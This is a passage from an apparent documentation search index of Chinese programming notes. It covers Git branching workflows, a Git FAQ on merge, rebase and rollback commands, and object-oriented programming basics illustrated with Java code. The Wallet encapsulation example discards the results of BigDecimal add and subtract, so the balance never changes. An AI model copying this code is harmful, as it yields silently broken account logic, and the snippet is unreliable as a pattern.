branch)\u3002\u4e00\u65e6\u5b8c\u6210\u76f8\u5e94\u7684\u5f00\u53d1\uff0c\u77ed\u671f\u5206\u652f\u88ab\u5408\u5e76\u5165develop\u6216master\uff0c\u7136\u540e\u5220\u9664\u8be5\u77ed\u671f\u5206\u652f\u3002</p> <p>\u8fd9\u79cd\u5de5\u4f5c\u6d41\u7a0b\u4f7f\u7528\u8d77\u6765\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u56e0\u4e3a\u7ef4\u62a4\u4e86\u4e24\u4e2a\u957f\u671f\u5206\u652f\uff0c\u53ef\u80fd\u9700\u8981\u7ecf\u5e38\u5207\u6362\u3002\u5b83\u6bd4\u8f83\u9002\u5408\u8f6f\u4ef6\u9879\u76ee\uff0c\u800c\u4e0d\u662f\u7f51\u7ad9\u9879\u76ee\uff0c\u56e0\u4e3a\u5927\u591a\u6570\u7f51\u7ad9\u662f\u6301\u7eed\u53d1\u5e03\u7684\uff0c\u4e00\u6709\u4ee3\u7801\u53d8\u52a8\u53ef\u80fd\u5c31\u4f1a\u66f4\u65b0\u4e00\u6b21\uff0c\u8fd9\u65f6\u5019\u5f80\u5f80master\u548cdevelop\u5206\u652f\u7684\u533a\u522b\u4e0d\u5927\uff0c\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u540c\u65f6\u7ef4\u62a4\u4e24\u5957\u4e86\u3002</p>"},{"location":"other/git/#github-flow","title":"Github Flow","text":"<p>\u8fd9\u5957\u5de5\u4f5c\u6d41\u7a0b\u5728Git Flow\u4e0a\u505a\u4e86\u7b80\u5316\uff0c\u53ea\u6709\u4e00\u4e2a\u957f\u671f\u5206\u652fmaster\uff0c\u9002\u5408\u4e8e\u6301\u7eed\u53d1\u5e03\u7684\u573a\u666f\uff0c\u662fgithub\u5b98\u65b9\u4f7f\u7528\u7684\u5de5\u4f5c\u6d41\u7a0b\uff0c\u5b83\u4eec\u4e5f\u505a\u4e86\u76f8\u5173\u7684\u4ecb\u7ecd\u3002\u5176\u5177\u4f53\u6d41\u7a0b\u662f\u8fd9\u6837\u7684:</p> <ol> <li>\u4f60\u4ecemaster\u4e2d\u62c9\u51fa\u65b0\u5206\u652f\uff0c\u4e0d\u533a\u5206\u662f\u529f\u80fd\u8fd8\u662f\u8865\u4e01</li> <li>\u65b0\u5206\u652f\u5f00\u53d1\u5b8c\u6210\u540e\uff0c\u5c31\u5411master\u53d1\u8d77\u4e00\u4e2aPR</li> <li>PR\u4f1a\u8ba9\u5176\u4ed6\u4eba\u6ce8\u610f\u5230\u4f60\u7684\u8bf7\u6c42\uff0c\u4e5f\u662f\u4e00\u79cd\u5bf9\u8bdd\u673a\u5236\uff0c\u8ba9\u5927\u5bb6\u90fd\u80fd\u6765\u53c2\u4e0e\u8bc4\u5ba1\u4f60\u7684\u4ee3\u7801\uff0c\u5bf9\u8bdd\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u4ee5\u4e0d\u65ad\u63d0\u4ea4\u4ee3\u7801</li> <li>\u4f60\u7684PR\u88ab\u63a5\u53d7\u5e76\u5165master\u4e2d\uff0c\u539f\u672c\u4f60\u62c9\u51fa\u6765\u7684\u5206\u652f\u5c31\u4f1a\u88ab\u5220\u9664</li> </ol> <p>\u8fd9\u79cd\u6d41\u7a0b\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5b83\u5047\u8bbemaster\u5206\u652f\u548c\u4ea7\u54c1\u7684\u53d1\u5e03\u662f\u4e00\u81f4\u7684\u3002\u8fd9\u5728\u4e00\u4e9b\u573a\u666f\uff0c\u4f8b\u5982\u82f9\u679cAppstore\u7684\u53d1\u5e03\u53ef\u80fd\u56e0\u4e3a\u5ba1\u6838\u8981\u5ef6\u8fdf\uff0c\u6216\u6709\u4e9b\u4ea7\u54c1\u662f\u8981\u6307\u5b9a\u65f6\u95f4\u53d1\u5e03\u7684\uff0c\u4e00\u4e2amaster\u5206\u652f\u5c31\u663e\u5f97\u4e0d\u591f\u4e86\u3002</p>"},{"location":"other/git/#gitlab-flow","title":"Gitlab Flow","text":"<p>Gitlab\u7ed3\u5408\u4e86Git flow\u548cGithub flow\u7684\u4f18\u70b9\uff0c\u65e2\u80fd\u9002\u5e94\u4e0d\u540c\u5f00\u53d1\u73af\u5883\u7684\u5f39\u6027\uff0c\u53c8\u4ecd\u7136\u53ea\u9700\u7ef4\u62a4\u5355\u4e00\u5206\u652f\uff0c\u5b98\u7f51\u4e5f\u6709\u76f8\u5173\u4ecb\u7ecd\u3002</p> <p>\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u539f\u5219\u5373\u4e0a\u6e38\u4f18\u5148\uff0c\u53ea\u5b58\u5728\u4e00\u4e2a\u4e3b\u5206\u652fmaster\uff0c\u5b83\u662f\u5176\u4ed6\u5206\u652f\u7684\u4e0a\u6e38\u3002\u53ea\u6709\u4e0a\u6e38\u5206\u652f\u53d8\u5316\u4e86\uff0c\u624d\u80fd\u5e94\u7528\u5230\u5176\u4ed6\u7684\u5206\u652f\u3002</p> <p>\u5bf9\u4e8e\u9700\u8981\u6301\u7eed\u53d1\u5e03\u7684\u9879\u76ee\uff0c\u5b83\u5efa\u8bae\u5728master\u4e4b\u5916\uff0c\u518d\u6839\u636e\u4e0d\u540c\u7684\u73af\u5883\u5efa\u7acb\u5206\u652f\u3002\u4f8b\u5982\u5f00\u53d1\u73af\u5883\u5b9a\u4e49\u4e3amaster\u662f\u6700\u4e0a\u6e38\uff0c\u9884\u5f00\u53d1\u73af\u5883\u5b9a\u4e49\u4e3apre-production\u662f\u5f00\u53d1\u73af\u5883\u7684\u4e0b\u6e38\uff0c\u751f\u4ea7\u73af\u5883\u5b9a\u4e49\u4e3aproduction\u662f\u6700\u4e0b\u6e38\u3002\u90a3\u4e48\u5f53\u751f\u4ea7\u73af\u5883\u51fa\u4e86bug\uff0c\u5c31\u8981\u65b0\u5efa\u4e00\u4e2a\u529f\u80fd\u5206\u652f\uff0c\u5148\u628a\u5b83\u5408\u5e76\u5165master\uff0c\u786e\u8ba4\u6ca1\u95ee\u9898\u518dcherry-pick\u81f3\u9884\u5f00\u53d1\u73af\u5883\uff0c\u6700\u7ec8\u518d\u8fdb\u5165\u751f\u4ea7\u73af\u5883\u3002\u53ea\u6709\u7d27\u6025\u60c5\u51b5\u624d\u5141\u8bb8\u8df3\u8fc7\u4e0a\u6e38\u76f4\u63a5\u5e76\u5165\u4e0b\u6e38\u3002</p> <p>\u5bf9\u4e8e\u9700\u8981\u6309\u7248\u672c\u53d1\u5e03\u7684\u9879\u76ee\uff0c\u5efa\u8bae\u7684\u505a\u6cd5\u662f\u6bcf\u4e00\u4e2a\u7248\u672c\u90fd\u8981\u4ecemaster\u4e2d\u62c9\u51fa\u4e00\u4e2a\u5206\u652f\u6765\uff0c\u5982<code>2-3-stable</code>\u3002\u4e4b\u540e\u53ea\u6709\u4fee\u8865bug\u624d\u5141\u8bb8\u5c06\u4ee3\u7801\u5408\u5e76\u5165\u8fd9\u4e9b\u5206\u652f\uff0c\u66f4\u65b0\u76f8\u5e94\u7684\u5c0f\u7248\u672c\u53f7\u3002</p>"},{"location":"other/git/#faq","title":"FAQ","text":"<p>\u6bcf\u6b21commit\uff0cGit\u50a8\u5b58\u7684\u662f\u5168\u65b0\u7684\u6587\u4ef6\u5feb\u7167\u8fd8\u662f\u50a8\u5b58\u6587\u4ef6\u7684\u53d8\u66f4\u90e8\u5206\uff1f</p> <p>Git\u50a8\u5b58\u7684\u662f\u5168\u65b0\u7684\u6587\u4ef6\u5feb\u7167\uff0c\u5373\u4f7f\u4f60\u53ea\u4fee\u6539\u4e86\u6587\u4ef6\u7684\u4e00\u884c\uff0c\u4e5f\u4f1a\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684blob\u5bf9\u8c61\u3002\u8fd9\u79cd\u50a8\u5b58\u65b9\u5f0f\u5b58\u50a8\u7684\u5bf9\u8c61\u683c\u5f0f\u88ab\u79f0\u4e3a\u677e\u6563(loose)\u683c\u5f0f\u3002</p> <p>\u8fd9\u6837\u52bf\u5fc5\u4f1a\u9020\u6210\u5927\u91cf\u7684\u7a7a\u95f4\u6d6a\u8d39\u3002\u4f46\u662f\uff0cGit\u4f1a\u65f6\u4e0d\u65f6\u7684\u628a\u8fd9\u4e9b\u677e\u6563\u683c\u5f0f\u7684\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a\u79f0\u4e3a\u5305\u6587\u4ef6(packfile)\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4ee5\u8282\u7701\u7a7a\u95f4\u548c\u63d0\u5347\u6548\u7387\u3002\u624b\u52a8\u6267\u884c<code>git gc</code>\u4e5f\u53ef\u4ee5\u8fbe\u5230\u8fd9\u79cd\u6548\u679c\u3002\u8fd9\u4e5f\u662f<code>./git/objects/info</code>\u548c<code>./git/objects/pack</code>\u4e24\u4e2a\u6587\u4ef6\u5939\u7684\u7528\u9014\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8981\u6709\u6682\u5b58\u533a\u7684\u6982\u5ff5\uff0c\u4e0d\u80fd\u76f4\u63a5\u5b58\u50a8\u4e48\uff1f</p> <p>\u56e0\u4e3a\u63d0\u4ea4\u662f\u9700\u8981\u539f\u5b50\u6027\u7684\uff0c\u5373\u4e00\u6b21\u63d0\u4ea4\u4e0b\u7684\u6587\u4ef6\uff0c\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002</p> <p>\u4f46\u5728Git\u7684\u547d\u4ee4\u884c\u4e0b\uff0c\u6211\u4eec\u5f88\u96be\u50cfSVN\u90a3\u6837\u6709\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\uff0c\u52fe\u9009\u8981\u63d0\u4ea4\u7684\u6587\u4ef6\uff0c\u586b\u5165\u63d0\u4ea4\u4fe1\u606f\uff0c\u70b9\u4e2a\u6309\u94ae\u5c31\u80fd\u5b8c\u6210\u63d0\u4ea4\u3002\u9700\u8981<code>git add</code>\u8fd9\u4e2a\u547d\u4ee4\u5e2e\u52a9\u6211\u4eec\u9009\u62e9\u8981\u63d0\u4ea4\u7684\u6587\u4ef6\u3002</p> <p>\u4f7f\u7528merge\u8fd8\u662frebase\u5408\u5e76\u5206\u652f\uff1f</p> <p><code>git merge</code>\u548c<code>git rebase</code>\u90fd\u88ab\u8bbe\u8ba1\u6765\u5c06\u4e00\u4e2a\u5206\u652f\u7684\u66f4\u6539\u5e76\u5165\u53e6\u4e00\u4e2a\u5206\u652f\uff0c\u4f46\u5b83\u4eec\u7684\u65b9\u5f0f\u5374\u4e0d\u592a\u4e00\u6837\u3002</p> <p>merge\u662f\u4e00\u4e2a\u5b89\u5168\u7684\u64cd\u4f5c\uff0c\u73b0\u6709\u7684\u5206\u652f\u4e0d\u4f1a\u88ab\u66f4\u6539\u3002\u4f46\u53e6\u4e00\u65b9\u9762\uff0c\u6bcf\u6b21\u5408\u5e76\u4e00\u4e2afeature\u5206\u652f\u65f6\u90fd\u4f1a\u5f15\u5165\u4e00\u4e2a\u5916\u6765\u7684\u5408\u5e76\u63d0\u4ea4\uff0c\u5f53\u540c\u65f6\u8fdb\u884c\u7684feature\u8fc7\u591a\u65f6\u4f1a\u4f7f\u5f97\u6574\u4e2a\u6811\u770b\u8d77\u6765\u975e\u5e38\u6742\u4e71\uff0c\u589e\u52a0\u4e86\u5f00\u53d1\u8005\u4e86\u89e3\u9879\u76ee\u5386\u53f2\u7684\u6210\u672c\u3002</p> <p>rebase\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u4f7f\u9879\u76ee\u7684\u5386\u53f2\u975e\u5e38\u7684\u6574\u6d01\u3001\u7ebf\u6027\uff0c\u53ef\u4ee5\u4ece\u9879\u76ee\u7684\u8d77\u70b9\u5f00\u59cb\u6d4f\u89c8\u5230\u7ec8\u70b9\u4e0d\u9700\u8981\u4efb\u4f55\u7684\u5206\u53c9\u3002\u4f46\u662f\u4e0d\u5408\u7406\u7684rebase\u4f1a\u7ed9\u56e2\u961f\u5176\u4ed6\u4eba\u534f\u540c\u5f00\u53d1\u5e26\u6765\u5f88\u5927\u7684\u56f0\u6270\u3002\u6b64\u5916\uff0crebase\u4e0d\u80fd\u5728\u5408\u5e76\u63d0\u4ea4\u65f6\u9644\u5e26message\uff0c\u4e5f\u5c31\u4e0d\u80fd\u50cfmerge\u90a3\u6837\u770b\u5230feature\u5206\u652f\u7684\u5e76\u5165\u5e26\u6765\u4e86\u54ea\u4e9b\u66f4\u6539\u3002</p> <p>\u6240\u5728\uff0c\u7edd\u4e0d\u80fd\u5728\u516c\u5171\u7684\u5206\u652f\u4f7f\u7528\u53d8\u57fa\uff0c\u4e5f\u4e0d\u80fd\u4f7f\u7528<code>git push -f</code>\u5f3a\u5236\u63a8\u9001\u53bb\u4fee\u6539\u8fdc\u7a0b\u4ed3\u5e93\u7684\u5386\u53f2\u3002\u5408\u7406\u7684\u4f7f\u7528\u573a\u666f\u5e94\u8be5\u50cf\u4e0b\u9762\u63cf\u8ff0\u7684\u8fd9\u6837:</p> <p>\u57fa\u4e8e\u4e0a\u6e38\u5206\u652fmaster\u62c9\u51fa\u6765\u4e00\u4e2adev\u7684\u5206\u652f\uff0c\u81ea\u884c\u5728dev\u4e0a\u5f00\u53d1\u5b8c\u6210\u540e\u53ef\u80fdmaster\u5df2\u7ecf\u6709\u4e86\u5176\u4ed6\u4eba\u5f00\u53d1\u7684\u65b0\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5e94\u8be5\u5728dev\u5206\u652f\u4e0a\u4f7f\u7528<code>git rebase master</code>\u628amaster\u5206\u652f\u7684\u5185\u5bb9\u5148\u540c\u6b65\u8fc7\u6765\uff0c\u7136\u540e\u5728master\u5206\u652f\u4e0a\u4f7f\u7528<code>git merge dev</code>\u628adev\u5206\u652f\u7684\u5185\u5bb9\u653e\u56de\u53bb\u3002</p> <p>\u6b64\u5916\uff0c\u4e00\u822c\u6709\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u53ef\u80fd\u662f\u901a\u8fc7<code>git pull --rebase</code>\u628a\u8fdc\u7a0b\u7684\u53d8\u66f4\u5185\u5bb9\u62ff\u56de\u6765\uff0c\u7136\u540e\u901a\u8fc7PR\u7684\u65b9\u5f0f\u7531\u8fdc\u7a0b\u4ed3\u5e93\u7684\u7ba1\u7406\u8005\u51b3\u5b9a\u5982\u4f55\u5e76\u5165\u8fdc\u7a0b\u5206\u652f\u3002</p> <p>\u4f7f\u7528revert\u3001reset\u8fd8\u662fcheckout\u56de\u6eda\u4ee3\u7801\uff1f</p> <p>\u4ee3\u7801\u7684\u56de\u6eda\u53ef\u4ee5\u5206\u4e3a\u56de\u6eda\u67d0\u6b21\u63d0\u4ea4\uff0c\u6216\u8005\u56de\u6eda\u67d0\u4e9b\u6587\u4ef6\u4e24\u4e2a\u5c42\u9762\u3002</p> <p>\u5bf9\u4e8e\u56de\u6eda\u63d0\u4ea4\uff0c\u5e94\u8be5\u4f7f\u7528reset\u548crevert\u3002</p> <p>reset\u7684\u672c\u8d28\u662f\u628aHEAD\u79fb\u52a8\u5230\u67d0\u4e2acommit\u7684\u4f4d\u7f6e\uff0c\u90a3\u4e48\u8be5\u5206\u652f\u4ece\u65b0HEAD\u5230\u672b\u7aef\u7684\u8fd9\u90e8\u5206\u5c31\u5904\u4e8e\u60ac\u6302\u72b6\u6001\uff0c\u5982\u679c\u4e0a\u9762\u6ca1\u6709\u4ec0\u4e48tag\u6216branch\u5f15\u7528\u7684\u8bdd\uff0c\u518d\u4e0b\u6b21git\u8fdb\u884c\u5783\u573e\u56de\u6536\u7684\u65f6\u5019\u5c31\u4f1a\u88ab\u5220\u9664\u3002reset\u672c\u8eab\u6709\u53c2\u6570\uff0c<code>--mixed</code>\u4e3a\u9ed8\u8ba4\u9009\u9879\uff0c\u8868\u793a\u6682\u5b58\u533a\u548c\u5c06\u8981reset\u7684\u63d0\u4ea4\u540c\u6b65\uff0c\u800c\u5de5\u4f5c\u533a\u4e0d\u53d7\u5f71\u54cd\uff1b\u4f7f\u7528<code>--hard</code>\u8868\u793a\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\u90fd\u548c\u5c06\u8981reset\u7684\u63d0\u4ea4\u540c\u6b65\uff1b\u4f7f\u7528<code>--soft</code>\u8868\u793a\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\u90fd\u4e0d\u505a\u6539\u53d8\u3002</p> <p>\u800crevert\u662f\u4e0d\u4f1a\u6539\u53d8\u63d0\u4ea4\u7684\u5386\u53f2\u7684\uff0c\u5b83\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u63d0\u4ea4\uff0c\u800c\u8fd9\u4e2a\u63d0\u4ea4\u7684\u5185\u5bb9\u662f\u64a4\u56de\u7684\u90e8\u5206\u3002\u6240\u4ee5revert\u5f80\u5f80\u7528\u4e8e\u516c\u5171\u7684\u5206\u652f\u4e0a\u3002</p> <p>\u5bf9\u4e8e\u6587\u4ef6\u63d0\u4ea4\uff0c\u5e94\u8be5\u4f7f\u7528reset\u548ccheckout\u3002\u533a\u522b\u5728\u4e8echeckout\u7528\u4e8e\u628a\u5de5\u4f5c\u533a\u4e2d\u7684\u67d0\u4e2a\u6587\u4ef6\u6062\u590d\u4e3a\u67d0\u4e2acommit\u4e2d\u7684\u8be5\u6587\u4ef6\uff0c\u800creset\u7528\u4e8e\u628a\u6682\u5b58\u533a\u4e2d\u7684\u67d0\u4e2a\u6587\u4ef6\u6062\u590d\u81f3\u67d0\u4e2acommit\u7684\u8be5\u6587\u4ef6\uff0c<code>--mixed</code>\u3001<code>--soft</code>\u3001<code>--hard</code>\u5bf9\u4e8e\u6062\u590d\u6587\u4ef6\u7684\u573a\u666f\u662f\u65e0\u6548\u7684\u53c2\u6570\u3002</p>"},{"location":"other/git/#_16","title":"\u76f8\u5173\u94fe\u63a5","text":"<ul> <li>\u56fe\u89e3git</li> <li>Pro git V2</li> <li>Write yourself a Git!</li> <li>Dulwich---Pure-Python Git implementation</li> <li>Oh Shit, Git!?!</li> <li>git\u53ef\u89c6\u5316</li> <li>LearnGitBranching</li> </ul>"},{"location":"other/oop/","title":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b","text":"<p>\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u82f1\u6587\u5168\u79f0\u662fObject Oriented Programming\uff0c\u5b83\u662f\u4e00\u79cd\u7f16\u7a0b\u8303\u5f0f\u6216\u8005\u8bf4\u7f16\u7a0b\u98ce\u683c\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u4ee5\u7c7b\u6216\u5bf9\u8c61\u4f5c\u4e3a\u7ec4\u7ec7\u4ee3\u7801\u7684\u57fa\u672c\u5355\u5143\uff0c\u5e76\u5c06\u5c01\u88c5\u3001\u7ee7\u627f\u3001\u62bd\u8c61\u3001\u591a\u6001\u8fd9\u56db\u79cd\u7279\u6027\u4f5c\u4e3a\u4ee3\u7801\u8bbe\u8ba1\u548c\u5b9e\u73b0\u7684\u57fa\u77f3\u3002</p>"},{"location":"other/oop/#_2","title":"\u56db\u5927\u7279\u6027","text":""},{"location":"other/oop/#_3","title":"\u5c01\u88c5","text":"<p>\u5c01\u88c5\u662f\u5bf9\u4fe1\u606f\u7684\u9690\u85cf\uff0c\u7c7b\u901a\u8fc7\u66b4\u9732\u6709\u9650\u7684\u63a5\u53e3\uff0c\u6388\u6743\u5916\u90e8\u53ea\u80fd\u901a\u8fc7\u7c7b\u672c\u8eab\u63d0\u4f9b\u7684\u65b9\u5f0f\u6765\u8bbf\u95ee\u6216\u8005\u4fee\u6539\u6570\u636e\u3002</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u8981\u505a\u4e00\u4e2a\u94b1\u5305\u7cfb\u7edf\uff0c\u5b83\u7684\u57fa\u7840\u4ee3\u7801\u53ef\u80fd\u662f\u8fd9\u6837\u7684: <pre><code>public class Wallet {\n    private String id;\n    private long createTime;\n    private BigDecimal balance;\n    private long balanceLastModifiedTime; \n    public Wallet() {\n        this.id = IdGenerator.getInstance().generate(); \n        this.createTime = System.currentTimeMillis();\n        this.balance = BigDecimal.ZERO; \n        this.balanceLastModifiedTime = System.currentTimeMillis();\n    }\n    public String getId() { return this.id; }\n    public long getCreateTime() { return this.createTime; }\n    public BigDecimal getBalance() { return this.balance; }\n    public long getBalanceLastModifiedTime() { return this.balanceLastModifiedTime; }\n    public void increaseBalance(BigDecimal increasedAmount) { \n        if (increasedAmount.compareTo(BigDecimal.ZERO) &lt; 0) {\n            throw new InvalidAmountException(\"...\"); \n        }\n        this.balance.add(increasedAmount);\n        this.balanceLastModifiedTime = System.currentTimeMillis(); \n    }\n    public void decreaseBalance(BigDecimal decreasedAmount) { \n        if (decreasedAmount.compareTo(BigDecimal.ZERO) &lt; 0) {\n            throw new InvalidAmountException(\"...\"); \n        }\n        if (decreasedAmount.compareTo(this.balance) &gt; 0) { \n            throw new InsufficientAmountException(\"...\");\n        }\n        this.balance.subtract(decreasedAmount); \n        this.balanceLastModifiedTime = System.currentTimeMillis();\n    }\n}\n</code></pre></p> <p>\u5bf9\u4e8e\u94b1\u5305\u7684\u56db\u4e2a\u5c5e\u6027\uff0c\u4ece\u4e1a\u52a1\u89d2\u5ea6\u8bb2\uff0cid\u548ccreateTime\u5e94\u8be5\u662f\u521b\u5efa\u94b1\u5305\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u597d\u4e0d\u4f1a\u53d8\u7684\uff0c\u6240\u4ee5\u53ea\u5728\u6784\u9020\u51fd\u6570\u4e2d\u786e\u5b9a\u4e0b\u6765\uff0c\u4e14\u6ca1\u6709\u76f8\u5e94\u7684\u65b9\u6cd5\u53bb\u4fee\u6539\u5b83\u4eec\u3002\u800c\u5bf9\u4e8e\u4f59\u989dbalance\u5c5e\u6027\uff0c\u53ea\u80fd\u589e\u6216\u8005\u51cf\uff0c\u800c\u4e0d\u4f1a\u91cd\u65b0\u8bbe\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u63d0\u4f9b\u4e86increaseBalance\u548cdecreaseBalance\u65b9\u6cd5\u3002\u5bf9\u4e8ebalanceLastModifiedTime\u5c5e\u6027\uff0c\u53ea\u6709\u5728\u4f59\u989d\u589e\u51cf\u65f6\uff0c\u5b83\u624d\u4f1a\u53d8\u52a8\uff0c\u6240\u4ee5\u4e5f\u662f\u7ed1\u5b9a\u5728\u4f59\u989d\u5c5e\u6027\u4fee\u6539\u7684\u65b9\u6cd5\u4e2d\u7684\u3002</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u7528Java\u5b9e\u73b0\uff0c\u80fd\u5f88\u597d\u7684\u5229\u7528\u8bed\u8a00\u63d0\u4f9b\u7684private\u3001public\u5173\u952e\u5b57\u6765\u8fbe\u5230\u8bbf\u95ee\u6743\u9650\u63a7\u5236\u7684\u76ee\u7684\u3002\u800c\u5bf9\u4e8ePython\u7b49\u8bed\u8a00\uff0c\u5c31\u6ca1\u529e\u6cd5\u5b8c\u5168\u610f\u4e49\u4e0a\u7684\u63a7\u5236\u8bbf\u95ee\u6743\u9650\u4e86\u3002</p> <p>\u5982\u679c\u6211\u4eec\u5bf9\u7c7b\u4e2d\u7684\u5c5e\u6027\u4e0d\u52a0\u4ee5\u8bbf\u95ee\u63a7\u5236\uff0c\u90a3\u4e48\u5916\u90e8\u7684\u6240\u6709\u4ee3\u7801\u90fd\u53ef\u4ee5\u8bbf\u95ee\u3001\u4fee\u6539\u8fd9\u4e9b\u5c5e\u6027\u3002\u8fd9\u6837\u770b\u8d77\u6765\u867d\u7136\u66f4\u7075\u6d3b\uff0c\u4f46\u8fc7\u5ea6\u7075\u6d3b\u7684\u4ee3\u4ef7\u5c31\u662f\u4ee3\u7801\u4e0d\u53ef\u63a7\u3002\u5c5e\u6027\u88ab\u968f\u610f\u4fee\u6539\u5e76\u4e14\u9690\u853d\u5728\u5404\u4e2a\u4ee3\u7801\u7684\u89d2\u843d\uff0c\u5fc5\u7136\u4f1a\u5f71\u54cd\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u548c\u53ef\u7ef4\u62a4\u6027\u3002</p>"},{"location":"other/oop/#_4","title":"\u62bd\u8c61","text":"<p>\u62bd\u8c61\u662f\u5bf9\u65b9\u6cd5\u7684\u5177\u4f53\u5b9e\u73b0\u7684\u9690\u85cf\uff0c\u8ba9\u8c03\u7528\u8005\u53ea\u9700\u8981\u5173\u5fc3\u65b9\u6cd5\u505a\u4e86\u4ec0\u4e48\u4e8b\u60c5\uff0c\u800c\u4e0d\u9700\u8981\u5173\u5fc3\u662f\u600e\u4e48\u505a\u7684\u3002\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u4e2d\uff0c\u901a\u5e38\u4f7f\u7528\u63a5\u53e3(\u5982java\u4e2d\u7684interface)\u6216\u62bd\u8c61\u7c7b\u6765\u5b9e\u73b0\u62bd\u8c61\u7279\u6027\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u62bd\u8c61\u8fd9\u4e2a\u6982\u5ff5\u662f\u5f88\u901a\u7528\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u5728\u9762\u5bf9\u590d\u6742\u7cfb\u7edf\u7684\u65f6\u5019\uff0c\u4eba\u8111\u80fd\u627f\u53d7\u7684\u4fe1\u606f\u590d\u6742\u5ea6\u662f\u6709\u9650\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8fc7\u6ee4\u6389\u4e00\u4e9b\u975e\u5173\u952e\u7684\u5b9e\u73b0\u7ec6\u8282\uff0c\u62bd\u8c61\u7684\u8bbe\u8ba1\u601d\u60f3\u80fd\u5f88\u597d\u7684\u5e2e\u52a9\u6211\u4eec\u3002\u6240\u4ee5\u62bd\u8c61\u6709\u65f6\u4e5f\u4f1a\u88ab\u6392\u9664\u5728\u9762\u5411\u5bf9\u8c61\u7684\u7279\u6027\u4e4b\u5916\uff0c\u6b63\u662f\u56e0\u4e3a\u5b83\u51e0\u4e4e\u5e94\u7528\u5728\u6240\u6709\u7684\u7f16\u7a0b\u573a\u666f\u4e0b\uff0c\u51fd\u6570\u672c\u8eab\u5c31\u662f\u4e00\u79cd\u62bd\u8c61\u3002</p>"},{"location":"other/oop/#_5","title":"\u7ee7\u627f","text":"<p>\u7ee7\u627f\u7528\u6765\u8868\u793a\u7c7b\u4e4b\u95f4is-a\u7684\u5173\u7cfb\uff0c\u5206\u4e3a\u5355\u7ee7\u627f\u548c\u591a\u7ee7\u627f\uff0c\u5b83\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u4ee3\u7801\u590d\u7528\u3002\u5047\u8bbe\u4e24\u4e2a\u7c7b\u6709\u4e00\u4e9b\u76f8\u540c\u7684\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u628a\u8fd9\u4e9b\u5171\u6709\u7684\u4e1c\u897f\u63d0\u53d6\u5230\u7236\u7c7b\u4e2d\uff0c\u5e76\u8ba9\u8fd9\u4e24\u4e2a\u7c7b\u7ee7\u627f\u7236\u7c7b\u3002</p> <p>\u4f46\u662f\uff0c\u8fc7\u5ea6\u7684\u4f7f\u7528\u7ee7\u627f\u4e5f\u4f1a\u5bfc\u81f4\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u3001\u53ef\u7ef4\u62a4\u6027\u53d8\u5dee\u3002\u8fc7\u591a\u7684\u4ee3\u7801\u5c42\u7ea7\uff0c\u5bfc\u81f4\u67e5\u627e\u4e00\u4e2a\u5c5e\u6027\u65f6\u53ef\u80fd\u8981\u4e0d\u65ad\u7684\u8ffd\u67e5\u5176\u7236\u7c7b\uff1b\u5b50\u7c7b\u548c\u7236\u7c7b\u7684\u9ad8\u5ea6\u8026\u5408\uff0c\u5bfc\u81f4\u4fee\u6539\u7236\u7c7b\u65f6\u53ef\u80fd\u5f71\u54cd\u5230\u5b50\u7c7b\u7b49\u90fd\u662f\u95ee\u9898\u3002\u6240\u4ee5\u4e5f\u6709\u5c11\u7528\u7ee7\u627f\u3001\u591a\u7528\u7ec4\u5408\u7684\u8bf4\u6cd5\u3002</p>"},{"location":"other/oop/#_6","title":"\u591a\u6001","text":"<p>\u540c\u4e00\u64cd\u4f5c\u4f5c\u7528\u4e8e\u4e0d\u540c\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u6709\u4e0d\u540c\u7684\u89e3\u91ca\uff0c\u4ea7\u751f\u4e0d\u540c\u7684\u6267\u884c\u7ed3\u679c\uff0c\u8fd9\u5c31\u662f\u591a\u6001\u6027\u3002</p> <p>\u800c\u5bf9\u4e8e\u591a\u6001\u7684\u5b9e\u73b0\uff0c\u6709\u591a\u79cd\u65b9\u5f0f\uff0c\u5e38\u89c1\u7684\u6709\u7ee7\u627f\u52a0\u65b9\u6cd5\u91cd\u5199\u3001\u63a5\u53e3\u7c7b\u3001ducking-type\u4e09\u79cd\u3002</p> <p><pre><code>public class Animal {\n    public void eat() {\n        System.out.println(\"\u52a8\u7269\u5403\u996d\");\n    }\n}\n\npublic class Cat extends Animal {\n    public void eat() {\n        System.out.println(\"\u732b\u5403\u996d\");\n    }\n}\n\npublic static void main(){\n    Animal am = new Cat();\n    am.eat();\n}\n</code></pre> 